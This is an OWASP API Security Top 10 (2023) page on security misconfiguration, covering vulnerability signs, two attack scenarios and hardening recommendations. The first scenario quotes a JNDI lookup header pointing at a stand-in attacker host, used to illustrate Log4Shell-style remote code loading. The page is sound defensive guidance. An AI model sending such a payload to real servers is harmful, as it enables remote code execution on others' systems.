...
<html lang="en" class="no-js">
  <head>
      ...
      <meta name="viewport" content="width=device-width,initial-scale=1">
        ...
        <link rel="canonical" href="https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/">
      
      
        <link rel="prev" href="../0xa7-server-side-request-forgery/">
      
      
        <link rel="next" href="../0xa9-improper-inventory-management/">
      ...
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.0.9">
        ...
        <title>API8:2023 Security Misconfiguration - OWASP API Security Top 10</title>
    ...
    <div data-md-component="skip">
        ...
        <a href="#api82023-security-misconfiguration" class="md-skip">
          Skip to content
        </a>
      ...
      <div class="md-select__inner">
        <ul class="md-select__list">
          <li class="md-select__item">
              ...
              <a href="https://owasp.org/API-Security/editions/2023/id/0xa8-security-misconfiguration/" hreflang="id" class="md-select__link">
                Bahasa (Indonesian)
              </a>
            </li>
          <li class="md-select__item">
              ...
              <a href="https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/" hreflang="en" class="md-select__link">
                English
              </a>
            </li>
          <li class="md-select__item">
              ...
              <a href="https://owasp.org/API-Security/editions/2023/fr/0xa8-security-misconfiguration/" hreflang="fr" class="md-select__link">
                Français
              </a>
            </li>
          <li class="md-select__item">
              ...
              <a href="https://owasp.org/API-Security/editions/2023/fa/0xa8-security-misconfiguration/" hreflang="fa" class="md-select__link">
                Persian
              </a>
            </li>
          <li class="md-select__item">
              ...
              <a href="https://owasp.org/API-Security/editions/2023/pt-pt/0xa8-security-misconfiguration/" hreflang="pt-pt" class="md-select__link">
                Português (Portugal)
              </a>
            </li>
...
<h1 id="api82023-security-misconfiguration">API8:2023 Security Misconfiguration</h1>
<table>
<thead>
<tr>
...
<tr>
<td>Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories to gain unauthorized access or knowledge of the system. Most of this is public knowledge and exploits may be available.</td>
<td>Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options.</td>
<td>Security misconfigurations not only expose sensitive user data, but also system details that can lead to full server compromise.</td>
</tr>
</tbody>
</table>
<h2 id="is-the-api-vulnerable">Is the API Vulnerable?</h2>
<p>The API might be vulnerable if:</p>
<ul>
<li>Appropriate security hardening is missing across any part of the API stack,
  or if there are improperly configured permissions on cloud services</li>
<li>The latest security patches are missing, or the systems are out of date</li>
<li>Unnecessary features are enabled (e.g. HTTP verbs, logging features)</li>
<li>There are discrepancies in the way incoming requests are processed by servers
  in the HTTP server chain</li>
<li>Transport Layer Security (TLS) is missing</li>
<li>Security or cache control directives are not sent to clients</li>
<li>A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set</li>
<li>Error messages include stack traces, or expose other sensitive information</li>
</ul>
<h2 id="example-attack-scenarios">Example Attack Scenarios</h2>
<h3 id="scenario-1">Scenario #1</h3>
<p>An API back-end server maintains an access log written by a popular third-party
...
pattern: <code>&lt;method&gt; &lt;api_version&gt;/&lt;path&gt; - &lt;status_code&gt;</code>.</p>
<p>A bad actor issues the following API request, which gets written to the access
log file:</p>
<pre><code>GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
</code></pre>
<p>Due to the insecure default configuration of the logging utility and a
permissive network outbound policy, in order to write the corresponding entry
to the access log, while expanding the value in the <code>X-Api-Version</code> request
header, the logging utility will pull and execute the <code>Malicious.class</code> object
from the attacker's remote controlled server.</p>
<h3 id="scenario-2">Scenario #2</h3>
<p>A social network website offers a "Direct Message" feature that allows users to
...
not required):</p>
<pre><code>GET /dm/user_updates.json?conversation_id=1234567&amp;cursor=GRlFp7LCUAAAA
</code></pre>
<p>Because the API response does not include the <code>Cache-Control</code> HTTP response
...
<p>The API life cycle should include:</p>
<ul>
<li>A repeatable hardening process leading to fast and easy deployment of a
  properly locked down environment</li>
<li>A task to review and update configurations across the entire API stack. The
  review should include: orchestration files, API components, and cloud
  services (e.g. S3 bucket permissions)</li>
<li>An automated process to continuously assess the effectiveness of the
  configuration and settings in all environments</li>
</ul>
<p>Furthermore:</p>
<ul>
<li>Ensure that all API communications from the client to the API server and any
  downstream/upstream components happen over an encrypted communication channel
  (TLS), regardless of whether it is an internal or public-facing API.</li>
<li>Be specific about which HTTP verbs each API can be accessed by: all other
  HTTP verbs should be disabled (e.g. HEAD).</li>
<li>APIs expecting to be accessed from browser-based clients (e.g., WebApp
  front-end) should, at least:<ul>
<li>implement a proper Cross-Origin Resource Sharing (CORS) policy</li>
<li>include applicable Security Headers</li>
</ul>
</li>
<li>Restrict incoming content types/data formats to those that meet the business/
  functional requirements.</li>
<li>Ensure all servers in the HTTP server chain (e.g. load balancers, reverse
  and forward proxies, and back-end servers) process incoming requests in a
  uniform manner to avoid desync issues.</li>
<li>Where applicable, define and enforce all API response payload schemas,
  including error responses, to prevent exception traces and other valuable
  information from being sent back to attackers.</li>
</ul>
<h2 id="references">References</h2>
<h3 id="owasp">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-secure-headers/">OWASP Secure Headers Project</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README">Configuration and Deployment Management Testing - Web Security Testing
  Guide</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README">Testing for Error Handling - Web Security Testing Guide</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery">Testing for Cross Site Request Forgery - Web Security Testing Guide</a></li>
</ul>
...
<li><a href="https://cwe.mitre.org/data/definitions/444.html">CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response
  Smuggling')</a></li>
...
<li><a href="https://csrc.nist.gov/publications/detail/sp/800-123/final">Guide to General Server Security</a>, NIST</li>
<li><a href="https://letsencrypt.org/">Let's Encrypt: a free, automated, and open Certificate Authority</a></li>
</ul>
      ...
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
          ...
          <a href="../0xa7-server-side-request-forgery/" class="md-footer__link md-footer__link--prev" aria-label="Previous: API7:2023 Server Side Request Forgery" rel="prev">
          ...
          <a href="../0xa9-improper-inventory-management/" class="md-footer__link md-footer__link--next" aria-label="Next: API9:2023 Improper Inventory Management" rel="next">
            <div class="md-footer__title">
              <div class="md-ellipsis">
                <span class="md-footer__direction">
                  Next
